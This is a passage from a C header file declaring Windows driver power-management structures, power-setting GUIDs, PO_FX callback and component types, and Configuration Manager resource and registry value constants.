#if (NTDDI_VERSION >= NTDDI_WINXP)

#define PDCAP_D0_SUPPORTED                       0x00000001
#define PDCAP_D1_SUPPORTED                       0x00000002
#define PDCAP_D2_SUPPORTED                       0x00000004
#define PDCAP_D3_SUPPORTED                       0x00000008
#define PDCAP_WAKE_FROM_D0_SUPPORTED             0x00000010
#define PDCAP_WAKE_FROM_D1_SUPPORTED             0x00000020
#define PDCAP_WAKE_FROM_D2_SUPPORTED             0x00000040
#define PDCAP_WAKE_FROM_D3_SUPPORTED             0x00000080
#define PDCAP_WARM_EJECT_SUPPORTED               0x00000100

typedef struct CM_Power_Data_s {
  ULONG PD_Size;
  DEVICE_POWER_STATE PD_MostRecentPowerState;
  ULONG PD_Capabilities;
  ULONG PD_D1Latency;
  ULONG PD_D2Latency;
  ULONG PD_D3Latency;
  DEVICE_POWER_STATE PD_PowerStateMapping[PowerSystemMaximum];
  SYSTEM_POWER_STATE PD_DeepestSystemWake;
} CM_POWER_DATA, *PCM_POWER_DATA;

#endif /* (NTDDI_VERSION >= NTDDI_WINXP) */

typedef enum _SYSTEM_POWER_CONDITION {
  PoAc,
  PoDc,
  PoHot,
  PoConditionMaximum
} SYSTEM_POWER_CONDITION;

typedef struct _SET_POWER_SETTING_VALUE {
  ULONG Version;
  GUID Guid;
  SYSTEM_POWER_CONDITION PowerCondition;
  ULONG DataLength;
  UCHAR Data[ANYSIZE_ARRAY];
} SET_POWER_SETTING_VALUE, *PSET_POWER_SETTING_VALUE;

#define POWER_SETTING_VALUE_VERSION              (0x1)

typedef struct _NOTIFY_USER_POWER_SETTING {
  GUID Guid;
} NOTIFY_USER_POWER_SETTING, *PNOTIFY_USER_POWER_SETTING;

typedef struct _APPLICATIONLAUNCH_SETTING_VALUE {
  LARGE_INTEGER ActivationTime;
  ULONG Flags;
  ULONG ButtonInstanceID;
} APPLICATIONLAUNCH_SETTING_VALUE, *PAPPLICATIONLAUNCH_SETTING_VALUE;

typedef enum _POWER_PLATFORM_ROLE {
  PlatformRoleUnspecified = 0,
  PlatformRoleDesktop,
  PlatformRoleMobile,
  PlatformRoleWorkstation,
  PlatformRoleEnterpriseServer,
  PlatformRoleSOHOServer,
  PlatformRoleAppliancePC,
  PlatformRolePerformanceServer,
  PlatformRoleSlate,
  PlatformRoleMaximum
} POWER_PLATFORM_ROLE;

#if (NTDDI_VERSION >= NTDDI_WINXP) || !defined(_BATCLASS_)
typedef struct {
  ULONG Granularity;
  ULONG Capacity;
} BATTERY_REPORTING_SCALE, *PBATTERY_REPORTING_SCALE;
#endif /* (NTDDI_VERSION >= NTDDI_WINXP) || !defined(_BATCLASS_) */

#endif /* !_PO_DDK_ */

#define CORE_PARKING_POLICY_CHANGE_IDEAL         0
#define CORE_PARKING_POLICY_CHANGE_SINGLE        1
#define CORE_PARKING_POLICY_CHANGE_ROCKET        2
#define CORE_PARKING_POLICY_CHANGE_MAX           CORE_PARKING_POLICY_CHANGE_ROCKET

DEFINE_GUID(GUID_MAX_POWER_SAVINGS, 0xA1841308, 0x3541, 0x4FAB, 0xBC, 0x81, 0xF7, 0x15, 0x56, 0xF2, 0x0B, 0x4A);
DEFINE_GUID(GUID_MIN_POWER_SAVINGS, 0x8C5E7FDA, 0xE8BF, 0x4A96, 0x9A, 0x85, 0xA6, 0xE2, 0x3A, 0x8C, 0x63, 0x5C);
DEFINE_GUID(GUID_TYPICAL_POWER_SAVINGS, 0x381B4222, 0xF694, 0x41F0, 0x96, 0x85, 0xFF, 0x5B, 0xB2, 0x60, 0xDF, 0x2E);
DEFINE_GUID(NO_SUBGROUP_GUID, 0xFEA3413E, 0x7E05, 0x4911, 0x9A, 0x71, 0x70, 0x03, 0x31, 0xF1, 0xC2, 0x94);
DEFINE_GUID(ALL_POWERSCHEMES_GUID, 0x68A1E95E, 0x13EA, 0x41E1, 0x80, 0x11, 0x0C, 0x49, 0x6C, 0xA4, 0x90, 0xB0);
DEFINE_GUID(GUID_POWERSCHEME_PERSONALITY, 0x245D8541, 0x3943, 0x4422, 0xB0, 0x25, 0x13, 0xA7, 0x84, 0xF6, 0x79, 0xB7);
DEFINE_GUID(GUID_ACTIVE_POWERSCHEME, 0x31F9F286, 0x5084, 0x42FE, 0xB7, 0x20, 0x2B, 0x02, 0x64, 0x99, 0x37, 0x63);
DEFINE_GUID(GUID_VIDEO_SUBGROUP, 0x7516B95F, 0xF776, 0x4464, 0x8C, 0x53, 0x06, 0x16, 0x7F, 0x40, 0xCC, 0x99);
DEFINE_GUID(GUID_VIDEO_POWERDOWN_TIMEOUT, 0x3C0BC021, 0xC8A8, 0x4E07, 0xA9, 0x73, 0x6B, 0x14, 0xCB, 0xCB, 0x2B, 0x7E);
DEFINE_GUID(GUID_VIDEO_ANNOYANCE_TIMEOUT, 0x82DBCF2D, 0xCD67, 0x40C5, 0xBF, 0xDC, 0x9F, 0x1A, 0x5C, 0xCD, 0x46, 0x63);
DEFINE_GUID(GUID_VIDEO_ADAPTIVE_PERCENT_INCREASE, 0xEED904DF, 0xB142, 0x4183, 0xB1, 0x0B, 0x5A, 0x11, 0x97, 0xA3, 0x78, 0x64);
DEFINE_GUID(GUID_VIDEO_DIM_TIMEOUT, 0x17aaa29b, 0x8b43, 0x4b94, 0xaa, 0xfe, 0x35, 0xf6, 0x4d, 0xaa, 0xf1, 0xee);
DEFINE_GUID(GUID_VIDEO_ADAPTIVE_POWERDOWN, 0x90959D22, 0xD6A1, 0x49B9, 0xAF, 0x93, 0xBC, 0xE8, 0x85, 0xAD, 0x33, 0x5B);
DEFINE_GUID(GUID_MONITOR_POWER_ON, 0x02731015, 0x4510, 0x4526, 0x99, 0xE6, 0xE5, 0xA1, 0x7E, 0xBD, 0x1A, 0xEA);
DEFINE_GUID(GUID_DEVICE_POWER_POLICY_VIDEO_BRIGHTNESS, 0xaded5e82L, 0xb909, 0x4619, 0x99, 0x49, 0xf5, 0xd7, 0x1d, 0xac, 0x0b, 0xcb);
DEFINE_GUID(GUID_DEVICE_POWER_POLICY_VIDEO_DIM_BRIGHTNESS, 0xf1fbfde2, 0xa960, 0x4165, 0x9f, 0x88, 0x50, 0x66, 0x79, 0x11, 0xce, 0x96);
DEFINE_GUID(GUID_VIDEO_CURRENT_MONITOR_BRIGHTNESS, 0x8ffee2c6, 0x2d01, 0x46be, 0xad, 0xb9, 0x39, 0x8a, 0xdd, 0xc5, 0xb4, 0xff);
DEFINE_GUID(GUID_VIDEO_ADAPTIVE_DISPLAY_BRIGHTNESS, 0xFBD9AA66, 0x9553, 0x4097, 0xBA, 0x44, 0xED, 0x6E, 0x9D, 0x65, 0xEA, 0xB8);
DEFINE_GUID(GUID_SESSION_DISPLAY_STATE, 0x73A5E93A, 0x5BB1, 0x4F93, 0x89, 0x5B, 0xDB, 0xD0, 0xDA, 0x85, 0x59, 0x67);
DEFINE_GUID(GUID_CONSOLE_DISPLAY_STATE, 0x6fe69556, 0x704a, 0x47a0, 0x8f, 0x24, 0xc2, 0x8d, 0x93, 0x6f, 0xda, 0x47);
DEFINE_GUID(GUID_ALLOW_DISPLAY_REQUIRED, 0xA9CEB8DA, 0xCD46, 0x44FB, 0xA9, 0x8B, 0x02, 0xAF, 0x69, 0xDE, 0x46, 0x23);
DEFINE_GUID(GUID_DISK_SUBGROUP, 0x0012EE47, 0x9041, 0x4B5D, 0x9B, 0x77, 0x53, 0x5F, 0xBA, 0x8B, 0x14, 0x42);
DEFINE_GUID(GUID_DISK_POWERDOWN_TIMEOUT, 0x6738E2C4, 0xE8A5, 0x4A42, 0xB1, 0x6A, 0xE0, 0x40, 0xE7, 0x69, 0x75, 0x6E);
DEFINE_GUID(GUID_DISK_BURST_IGNORE_THRESHOLD, 0x80e3c60e, 0xbb94, 0x4ad8, 0xbb, 0xe0, 0x0d, 0x31, 0x95, 0xef, 0xc6, 0x63);
DEFINE_GUID(GUID_DISK_ADAPTIVE_POWERDOWN, 0x396A32E1, 0x499A, 0x40B2, 0x91, 0x24, 0xA9, 0x6A, 0xFE, 0x70, 0x76, 0x67);
DEFINE_GUID(GUID_SLEEP_SUBGROUP, 0x238C9FA8, 0x0AAD, 0x41ED, 0x83, 0xF4, 0x97, 0xBE, 0x24, 0x2C, 0x8F, 0x20);
DEFINE_GUID(GUID_SLEEP_IDLE_THRESHOLD, 0x81cd32e0, 0x7833, 0x44f3, 0x87, 0x37, 0x70, 0x81, 0xf3, 0x8d, 0x1f, 0x70);
DEFINE_GUID(GUID_STANDBY_TIMEOUT, 0x29F6C1DB, 0x86DA, 0x48C5, 0x9F, 0xDB, 0xF2, 0xB6, 0x7B, 0x1F, 0x44, 0xDA);
DEFINE_GUID(GUID_UNATTEND_SLEEP_TIMEOUT, 0x7bc4a2f9, 0xd8fc, 0x4469, 0xb0, 0x7b, 0x33, 0xeb, 0x78, 0x5a, 0xac, 0xa0);
DEFINE_GUID(GUID_HIBERNATE_TIMEOUT, 0x9D7815A6, 0x7EE4, 0x497E, 0x88, 0x88, 0x51, 0x5A, 0x05, 0xF0, 0x23, 0x64);
DEFINE_GUID(GUID_HIBERNATE_FASTS4_POLICY, 0x94AC6D29, 0x73CE, 0x41A6, 0x80, 0x9F, 0x63, 0x63, 0xBA, 0x21, 0xB4, 0x7E);
DEFINE_GUID(GUID_CRITICAL_POWER_TRANSITION,  0xB7A27025, 0xE569, 0x46c2, 0xA5, 0x04, 0x2B, 0x96, 0xCA, 0xD2, 0x25, 0xA1);
DEFINE_GUID(GUID_SYSTEM_AWAYMODE, 0x98A7F580, 0x01F7, 0x48AA, 0x9C, 0x0F, 0x44, 0x35, 0x2C, 0x29, 0xE5, 0xC0);
DEFINE_GUID(GUID_ALLOW_AWAYMODE, 0x25dfa149, 0x5dd1, 0x4736, 0xb5, 0xab, 0xe8, 0xa3, 0x7b, 0x5b, 0x81, 0x87);
DEFINE_GUID(GUID_ALLOW_STANDBY_STATES, 0xabfc2519, 0x3608, 0x4c2a, 0x94, 0xea, 0x17, 0x1b, 0x0e, 0xd5, 0x46, 0xab);
DEFINE_GUID(GUID_ALLOW_RTC_WAKE, 0xBD3B718A, 0x0680, 0x4D9D, 0x8A, 0xB2, 0xE1, 0xD2, 0xB4, 0xAC, 0x80, 0x6D);
DEFINE_GUID(GUID_ALLOW_SYSTEM_REQUIRED, 0xA4B195F5, 0x8225, 0x47D8, 0x80, 0x12, 0x9D, 0x41, 0x36, 0x97, 0x86, 0xE2);
DEFINE_GUID(GUID_SYSTEM_BUTTON_SUBGROUP, 0x4F971E89, 0xEEBD, 0x4455, 0xA8, 0xDE, 0x9E, 0x59, 0x04, 0x0E, 0x73, 0x47);
DEFINE_GUID(GUID_POWERBUTTON_ACTION, 0x7648EFA3, 0xDD9C, 0x4E3E, 0xB5, 0x66, 0x50, 0xF9, 0x29, 0x38, 0x62, 0x80);
DEFINE_GUID(GUID_POWERBUTTON_ACTION_FLAGS, 0x857E7FAC, 0x034B, 0x4704, 0xAB, 0xB1, 0xBC, 0xA5, 0x4A, 0xA3, 0x14, 0x78);
DEFINE_GUID(GUID_SLEEPBUTTON_ACTION, 0x96996BC0, 0xAD50, 0x47EC, 0x92, 0x3B, 0x6F, 0x41, 0x87, 0x4D, 0xD9, 0xEB);
DEFINE_GUID(GUID_SLEEPBUTTON_ACTION_FLAGS, 0x2A160AB1, 0xB69D, 0x4743, 0xB7, 0x18, 0xBF, 0x14, 0x41, 0xD5, 0xE4, 0x93);
DEFINE_GUID(GUID_USERINTERFACEBUTTON_ACTION, 0xA7066653, 0x8D6C, 0x40A8, 0x91, 0x0E, 0xA1, 0xF5, 0x4B, 0x84, 0xC7, 0xE5);
DEFINE_GUID(GUID_LIDCLOSE_ACTION, 0x5CA83367, 0x6E45, 0x459F, 0xA2, 0x7B, 0x47, 0x6B, 0x1D, 0x01, 0xC9, 0x36);
DEFINE_GUID(GUID_LIDCLOSE_ACTION_FLAGS, 0x97E969AC, 0x0D6C, 0x4D08, 0x92, 0x7C, 0xD7, 0xBD, 0x7A, 0xD7, 0x85, 0x7B);
DEFINE_GUID(GUID_LIDOPEN_POWERSTATE, 0x99FF10E7, 0x23B1, 0x4C07, 0xA9, 0xD1, 0x5C, 0x32, 0x06, 0xD7, 0x41, 0xB4);
DEFINE_GUID(GUID_BATTERY_SUBGROUP, 0xE73A048D, 0xBF27, 0x4F12, 0x97, 0x31, 0x8B, 0x20, 0x76, 0xE8, 0x89, 0x1F);
DEFINE_GUID(GUID_BATTERY_DISCHARGE_ACTION_0, 0x637EA02F, 0xBBCB, 0x4015, 0x8E, 0x2C, 0xA1, 0xC7, 0xB9, 0xC0, 0xB5, 0x46);
DEFINE_GUID(GUID_BATTERY_DISCHARGE_LEVEL_0, 0x9A66D8D7, 0x4FF7, 0x4EF9, 0xB5, 0xA2, 0x5A, 0x32, 0x6C, 0xA2, 0xA4, 0x69);
DEFINE_GUID(GUID_BATTERY_DISCHARGE_FLAGS_0, 0x5dbb7c9f, 0x38e9, 0x40d2, 0x97, 0x49, 0x4f, 0x8a, 0x0e, 0x9f, 0x64, 0x0f);
DEFINE_GUID(GUID_BATTERY_DISCHARGE_ACTION_1, 0xD8742DCB, 0x3E6A, 0x4B3C, 0xB3, 0xFE, 0x37, 0x46, 0x23, 0xCD, 0xCF, 0x06);
DEFINE_GUID(GUID_BATTERY_DISCHARGE_LEVEL_1, 0x8183BA9A, 0xE910, 0x48DA, 0x87, 0x69, 0x14, 0xAE, 0x6D, 0xC1, 0x17, 0x0A);
DEFINE_GUID(GUID_BATTERY_DISCHARGE_FLAGS_1, 0xbcded951, 0x187b, 0x4d05, 0xbc, 0xcc, 0xf7, 0xe5, 0x19, 0x60, 0xc2, 0x58);
DEFINE_GUID(GUID_BATTERY_DISCHARGE_ACTION_2, 0x421CBA38, 0x1A8E, 0x4881, 0xAC, 0x89, 0xE3, 0x3A, 0x8B, 0x04, 0xEC, 0xE4);
DEFINE_GUID(GUID_BATTERY_DISCHARGE_LEVEL_2, 0x07A07CA2, 0xADAF, 0x40D7, 0xB0, 0x77, 0x53, 0x3A, 0xAD, 0xED, 0x1B, 0xFA);
DEFINE_GUID(GUID_BATTERY_DISCHARGE_FLAGS_2, 0x7fd2f0c4, 0xfeb7, 0x4da3, 0x81, 0x17, 0xe3, 0xfb, 0xed, 0xc4, 0x65, 0x82);
DEFINE_GUID(GUID_BATTERY_DISCHARGE_ACTION_3, 0x80472613, 0x9780, 0x455E, 0xB3, 0x08, 0x72, 0xD3, 0x00, 0x3C, 0xF2, 0xF8);
DEFINE_GUID(GUID_BATTERY_DISCHARGE_LEVEL_3, 0x58AFD5A6, 0xC2DD, 0x47D2, 0x9F, 0xBF, 0xEF, 0x70, 0xCC, 0x5C, 0x59, 0x65);
DEFINE_GUID(GUID_BATTERY_DISCHARGE_FLAGS_3, 0x73613ccf, 0xdbfa, 0x4279, 0x83, 0x56, 0x49, 0x35, 0xf6, 0xbf, 0x62, 0xf3);
DEFINE_GUID(GUID_PROCESSOR_SETTINGS_SUBGROUP, 0x54533251, 0x82BE, 0x4824, 0x96, 0xC1, 0x47, 0xB6, 0x0B, 0x74, 0x0D, 0x00);
DEFINE_GUID(GUID_PROCESSOR_THROTTLE_POLICY, 0x57027304, 0x4AF6, 0x4104, 0x92, 0x60, 0xE3, 0xD9, 0x52, 0x48, 0xFC, 0x36);
DEFINE_GUID(GUID_PROCESSOR_THROTTLE_MAXIMUM, 0xBC5038F7, 0x23E0, 0x4960, 0x96, 0xDA, 0x33, 0xAB, 0xAF, 0x59, 0x35, 0xEC);
DEFINE_GUID(GUID_PROCESSOR_THROTTLE_MINIMUM, 0x893DEE8E, 0x2BEF, 0x41E0, 0x89, 0xC6, 0xB5, 0x5D, 0x09, 0x29, 0x96, 0x4C);
DEFINE_GUID(GUID_PROCESSOR_ALLOW_THROTTLING, 0x3b04d4fd, 0x1cc7, 0x4f23, 0xab, 0x1c, 0xd1, 0x33, 0x78, 0x19, 0xc4, 0xbb);
DEFINE_GUID(GUID_PROCESSOR_IDLESTATE_POLICY, 0x68f262a7, 0xf621, 0x4069, 0xb9, 0xa5, 0x48, 0x74, 0x16, 0x9b, 0xe2, 0x3c);
DEFINE_GUID(GUID_PROCESSOR_PERFSTATE_POLICY, 0xBBDC3814, 0x18E9, 0x4463, 0x8A, 0x55, 0xD1, 0x97, 0x32, 0x7C, 0x45, 0xC0);
DEFINE_GUID(GUID_PROCESSOR_PERF_INCREASE_THRESHOLD, 0x06cadf0e, 0x64ed, 0x448a, 0x89, 0x27, 0xce, 0x7b, 0xf9, 0x0e, 0xb3, 0x5d);
DEFINE_GUID(GUID_PROCESSOR_PERF_DECREASE_THRESHOLD, 0x12a0ab44, 0xfe28, 0x4fa9, 0xb3, 0xbd, 0x4b, 0x64, 0xf4, 0x49, 0x60, 0xa6);
DEFINE_GUID(GUID_PROCESSOR_PERF_INCREASE_POLICY, 0x465e1f50, 0xb610, 0x473a, 0xab, 0x58, 0x0, 0xd1, 0x7, 0x7d, 0xc4, 0x18);
DEFINE_GUID(GUID_PROCESSOR_PERF_DECREASE_POLICY, 0x40fbefc7, 0x2e9d, 0x4d25, 0xa1, 0x85, 0xc, 0xfd, 0x85, 0x74, 0xba, 0xc6);
DEFINE_GUID(GUID_PROCESSOR_PERF_INCREASE_TIME, 0x984cf492, 0x3bed, 0x4488, 0xa8, 0xf9, 0x42, 0x86, 0xc9, 0x7b, 0xf5, 0xaa);
DEFINE_GUID(GUID_PROCESSOR_PERF_DECREASE_TIME, 0xd8edeb9b, 0x95cf, 0x4f95, 0xa7, 0x3c, 0xb0, 0x61, 0x97, 0x36, 0x93, 0xc8);
DEFINE_GUID(GUID_PROCESSOR_PERF_TIME_CHECK, 0x4d2b0152, 0x7d5c, 0x498b, 0x88, 0xe2, 0x34, 0x34, 0x53, 0x92, 0xa2, 0xc5);
DEFINE_GUID(GUID_PROCESSOR_PERF_BOOST_POLICY, 0x45bcc044, 0xd885, 0x43e2, 0x86, 0x5, 0xee, 0xe, 0xc6, 0xe9, 0x6b, 0x59);
DEFINE_GUID(GUID_PROCESSOR_IDLE_ALLOW_SCALING, 0x6c2993b0, 0x8f48, 0x481f, 0xbc, 0xc6, 0x0, 0xdd, 0x27, 0x42, 0xaa, 0x6);
DEFINE_GUID(GUID_PROCESSOR_IDLE_DISABLE, 0x5d76a2ca, 0xe8c0, 0x402f, 0xa1, 0x33, 0x21, 0x58, 0x49, 0x2d, 0x58, 0xad);
DEFINE_GUID(GUID_PROCESSOR_IDLE_TIME_CHECK, 0xc4581c31, 0x89ab, 0x4597, 0x8e, 0x2b, 0x9c, 0x9c, 0xab, 0x44, 0xe, 0x6b);
DEFINE_GUID(GUID_PROCESSOR_IDLE_DEMOTE_THRESHOLD, 0x4b92d758, 0x5a24, 0x4851, 0xa4, 0x70, 0x81, 0x5d, 0x78, 0xae, 0xe1, 0x19);
DEFINE_GUID(GUID_PROCESSOR_IDLE_PROMOTE_THRESHOLD, 0x7b224883, 0xb3cc, 0x4d79, 0x81, 0x9f, 0x83, 0x74, 0x15, 0x2c, 0xbe, 0x7c);
DEFINE_GUID(GUID_PROCESSOR_CORE_PARKING_INCREASE_THRESHOLD, 0xdf142941, 0x20f3, 0x4edf, 0x9a, 0x4a, 0x9c, 0x83, 0xd3, 0xd7, 0x17, 0xd1);
DEFINE_GUID(GUID_PROCESSOR_CORE_PARKING_DECREASE_THRESHOLD, 0x68dd2f27, 0xa4ce, 0x4e11, 0x84, 0x87, 0x37, 0x94, 0xe4, 0x13, 0x5d, 0xfa);
DEFINE_GUID(GUID_PROCESSOR_CORE_PARKING_INCREASE_POLICY, 0xc7be0679, 0x2817, 0x4d69, 0x9d, 0x02, 0x51, 0x9a, 0x53, 0x7e, 0xd0, 0xc6);
DEFINE_GUID(GUID_PROCESSOR_CORE_PARKING_DECREASE_POLICY, 0x71021b41, 0xc749, 0x4d21, 0xbe, 0x74, 0xa0, 0x0f, 0x33, 0x5d, 0x58, 0x2b);
DEFINE_GUID(GUID_PROCESSOR_CORE_PARKING_MAX_CORES, 0xea062031, 0x0e34, 0x4ff1, 0x9b, 0x6d, 0xeb, 0x10, 0x59, 0x33, 0x40, 0x28);
DEFINE_GUID(GUID_PROCESSOR_CORE_PARKING_MIN_CORES, 0x0cc5b647, 0xc1df, 0x4637, 0x89, 0x1a, 0xde, 0xc3, 0x5c, 0x31, 0x85, 0x83);
DEFINE_GUID(GUID_PROCESSOR_CORE_PARKING_INCREASE_TIME, 0x2ddd5a84, 0x5a71, 0x437e, 0x91, 0x2a, 0xdb, 0x0b, 0x8c, 0x78, 0x87, 0x32);
DEFINE_GUID(GUID_PROCESSOR_CORE_PARKING_DECREASE_TIME, 0xdfd10d17, 0xd5eb, 0x45dd, 0x87, 0x7a, 0x9a, 0x34, 0xdd, 0xd1, 0x5c, 0x82);
DEFINE_GUID(GUID_PROCESSOR_CORE_PARKING_AFFINITY_HISTORY_DECREASE_FACTOR, 0x8f7b45e3, 0xc393, 0x480a, 0x87, 0x8c, 0xf6, 0x7a, 0xc3, 0xd0, 0x70, 0x82);
DEFINE_GUID(GUID_PROCESSOR_CORE_PARKING_AFFINITY_HISTORY_THRESHOLD, 0x5b33697b, 0xe89d, 0x4d38, 0xaa, 0x46, 0x9e, 0x7d, 0xfb, 0x7c, 0xd2, 0xf9);
DEFINE_GUID(GUID_PROCESSOR_CORE_PARKING_AFFINITY_WEIGHTING, 0xe70867f1, 0xfa2f, 0x4f4e, 0xae, 0xa1, 0x4d, 0x8a, 0x0b, 0xa2, 0x3b, 0x20);
DEFINE_GUID(GUID_PROCESSOR_CORE_PARKING_OVER_UTILIZATION_HISTORY_DECREASE_FACTOR, 0x1299023c, 0xbc28, 0x4f0a, 0x81, 0xec, 0xd3, 0x29, 0x5a, 0x8d, 0x81, 0x5d);
DEFINE_GUID(GUID_PROCESSOR_CORE_PARKING_OVER_UTILIZATION_HISTORY_THRESHOLD, 0x9ac18e92, 0xaa3c, 0x4e27, 0xb3, 0x07, 0x01, 0xae, 0x37, 0x30, 0x71, 0x29);
DEFINE_GUID(GUID_PROCESSOR_CORE_PARKING_OVER_UTILIZATION_WEIGHTING, 0x8809c2d8, 0xb155, 0x42d4, 0xbc, 0xda, 0x0d, 0x34, 0x56, 0x51, 0xb1, 0xdb);
DEFINE_GUID(GUID_PROCESSOR_CORE_PARKING_OVER_UTILIZATION_THRESHOLD, 0x943c8cb6, 0x6f93, 0x4227, 0xad, 0x87, 0xe9, 0xa3, 0xfe, 0xec, 0x08, 0xd1);
DEFINE_GUID(GUID_PROCESSOR_PARKING_CORE_OVERRIDE, 0xa55612aa, 0xf624, 0x42c6, 0xa4, 0x43, 0x73, 0x97, 0xd0, 0x64, 0xc0, 0x4f);
DEFINE_GUID(GUID_PROCESSOR_PARKING_PERF_STATE, 0x447235c7, 0x6a8d, 0x4cc0, 0x8e, 0x24, 0x9e, 0xaf, 0x70, 0xb9, 0x6e, 0x2b);
DEFINE_GUID(GUID_PROCESSOR_PERF_HISTORY, 0x7d24baa7, 0x0b84, 0x480f, 0x84, 0x0c, 0x1b, 0x07, 0x43, 0xc0, 0x0f, 0x5f);
DEFINE_GUID(GUID_SYSTEM_COOLING_POLICY, 0x94D3A615, 0xA899, 0x4AC5, 0xAE, 0x2B, 0xE4, 0xD8, 0xF6, 0x34, 0x36, 0x7F);
DEFINE_GUID(GUID_LOCK_CONSOLE_ON_WAKE, 0x0E796BDB, 0x100D, 0x47D6, 0xA2, 0xD5, 0xF7, 0xD2, 0xDA, 0xA5, 0x1F, 0x51);
DEFINE_GUID(GUID_DEVICE_IDLE_POLICY, 0x4faab71a, 0x92e5, 0x4726, 0xb5, 0x31, 0x22, 0x45, 0x59, 0x67, 0x2d, 0x19);
DEFINE_GUID(GUID_ACDC_POWER_SOURCE, 0x5D3E9A59, 0xE9D5, 0x4B00, 0xA6, 0xBD, 0xFF, 0x34, 0xFF, 0x51, 0x65, 0x48);
DEFINE_GUID(GUID_LIDSWITCH_STATE_CHANGE,  0xBA3E0F4D, 0xB817, 0x4094, 0xA2, 0xD1, 0xD5, 0x63, 0x79, 0xE6, 0xA0, 0xF3);
DEFINE_GUID(GUID_BATTERY_PERCENTAGE_REMAINING, 0xA7AD8041, 0xB45A, 0x4CAE, 0x87, 0xA3, 0xEE, 0xCB, 0xB4, 0x68, 0xA9, 0xE1);
DEFINE_GUID(GUID_IDLE_BACKGROUND_TASK, 0x515C31D8, 0xF734, 0x163D, 0xA0, 0xFD, 0x11, 0xA0, 0x8C, 0x91, 0xE8, 0xF1);
DEFINE_GUID(GUID_BACKGROUND_TASK_NOTIFICATION, 0xCF23F240, 0x2A54, 0x48D8, 0xB1, 0x14, 0xDE, 0x15, 0x18, 0xFF, 0x05, 0x2E);
DEFINE_GUID(GUID_APPLAUNCH_BUTTON, 0x1A689231, 0x7399, 0x4E9A, 0x8F, 0x99, 0xB7, 0x1F, 0x99, 0x9D, 0xB3, 0xFA);
DEFINE_GUID(GUID_PCIEXPRESS_SETTINGS_SUBGROUP, 0x501a4d13, 0x42af,0x4429, 0x9f, 0xd1, 0xa8, 0x21, 0x8c, 0x26, 0x8e, 0x20);
DEFINE_GUID(GUID_PCIEXPRESS_ASPM_POLICY, 0xee12f906, 0xd277, 0x404b, 0xb6, 0xda, 0xe5, 0xfa, 0x1a, 0x57, 0x6d, 0xf5);
DEFINE_GUID(GUID_ENABLE_SWITCH_FORCED_SHUTDOWN, 0x833a6b62, 0xdfa4, 0x46d1, 0x82, 0xf8, 0xe0, 0x9e, 0x34, 0xd0, 0x29, 0xd6);

#define PERFSTATE_POLICY_CHANGE_IDEAL            0
#define PERFSTATE_POLICY_CHANGE_SINGLE           1
#define PERFSTATE_POLICY_CHANGE_ROCKET           2
#define PERFSTATE_POLICY_CHANGE_MAX              PERFSTATE_POLICY_CHANGE_ROCKET

#define PROCESSOR_PERF_BOOST_POLICY_DISABLED     0
#define PROCESSOR_PERF_BOOST_POLICY_MAX          100

#define POWER_DEVICE_IDLE_POLICY_PERFORMANCE     0
#define POWER_DEVICE_IDLE_POLICY_CONSERVATIVE    1

typedef VOID
(NTAPI REQUEST_POWER_COMPLETE)(
  IN struct _DEVICE_OBJECT *DeviceObject,
  IN UCHAR MinorFunction,
  IN POWER_STATE PowerState,
  IN PVOID Context,
  IN struct _IO_STATUS_BLOCK *IoStatus);
typedef REQUEST_POWER_COMPLETE *PREQUEST_POWER_COMPLETE;

typedef
NTSTATUS
(NTAPI POWER_SETTING_CALLBACK)(
  IN LPCGUID SettingGuid,
  IN PVOID Value,
  IN ULONG ValueLength,
  IN OUT PVOID Context OPTIONAL);
typedef POWER_SETTING_CALLBACK *PPOWER_SETTING_CALLBACK;

DECLARE_HANDLE(POHANDLE);

#define PO_FX_VERSION_V1 1
#define PO_FX_VERSION_V2 2
#define PO_FX_VERSION PO_FX_VERSION_V2

typedef void (NTAPI PO_FX_COMPONENT_ACTIVE_CONDITION_CALLBACK)(void *context, ULONG component);
typedef PO_FX_COMPONENT_ACTIVE_CONDITION_CALLBACK *PPO_FX_COMPONENT_ACTIVE_CONDITION_CALLBACK;

typedef void (NTAPI PO_FX_COMPONENT_IDLE_CONDITION_CALLBACK)(void *context, ULONG component);
typedef PO_FX_COMPONENT_IDLE_CONDITION_CALLBACK *PPO_FX_COMPONENT_IDLE_CONDITION_CALLBACK;

typedef void (NTAPI PO_FX_COMPONENT_IDLE_STATE_CALLBACK)(void *context, ULONG component, ULONG state);
typedef PO_FX_COMPONENT_IDLE_STATE_CALLBACK *PPO_FX_COMPONENT_IDLE_STATE_CALLBACK;

typedef NTSTATUS (NTAPI PO_FX_POWER_CONTROL_CALLBACK)(void *context, const GUID *code, void *in, SIZE_T in_size, void *out, SIZE_T out_size, SIZE_T *ret_size);
typedef PO_FX_POWER_CONTROL_CALLBACK *PPO_FX_POWER_CONTROL_CALLBACK;

typedef struct _PO_FX_COMPONENT_IDLE_STATE
{
    ULONGLONG TransitionLatency;
    ULONGLONG ResidencyRequirement;
    ULONG NominalPower;
} PO_FX_COMPONENT_IDLE_STATE, *PPO_FX_COMPONENT_IDLE_STATE;

typedef struct _PO_FX_COMPONENT_V1
{
    GUID Id;
    ULONG IdleStateCount;
    ULONG DeepestWakeableIdleState;
    PO_FX_COMPONENT_IDLE_STATE *IdleStates;
} PO_FX_COMPONENT_V1, *PPO_FX_COMPONENT_V1;

typedef struct _PO_FX_COMPONENT_V2
{
    GUID Id;
    ULONGLONG Flags;
    ULONG DeepestWakeableIdleState;
    ULONG IdleStateCount;
    PO_FX_COMPONENT_IDLE_STATE *IdleStates;
    ULONG ProviderCount;
    ULONG *Providers;
} PO_FX_COMPONENT_V2, *PPO_FX_COMPONENT_V2;

#if PO_FX_VERSION == PO_FX_VERSION_V1
typedef PO_FX_COMPONENT_V1 PO_FX_COMPONENT, *PPO_FX_COMPONENT;
#else
typedef PO_FX_COMPONENT_V2 PO_FX_COMPONENT, *PPO_FX_COMPONENT;
#endif

/******************************************************************************
 *                            Configuration Manager Types                     *
 ******************************************************************************/

/* Resource list definitions */
typedef int CM_RESOURCE_TYPE;

#define CmResourceTypeNull              0
#define CmResourceTypePort              1
#define CmResourceTypeInterrupt         2
#define CmResourceTypeMemory            3
#define CmResourceTypeDma               4
#define CmResourceTypeDeviceSpecific    5
#define CmResourceTypeBusNumber         6
#define CmResourceTypeNonArbitrated     128
#define CmResourceTypeConfigData        128
#define CmResourceTypeDevicePrivate     129
#define CmResourceTypePcCardConfig      130
#define CmResourceTypeMfCardConfig      131

/* KEY_VALUE_Xxx.Type */
#define REG_NONE                           0
#define REG_SZ                             1
#define REG_EXPAND_SZ                      2
#define REG_BINARY                         3
#define REG_DWORD                          4
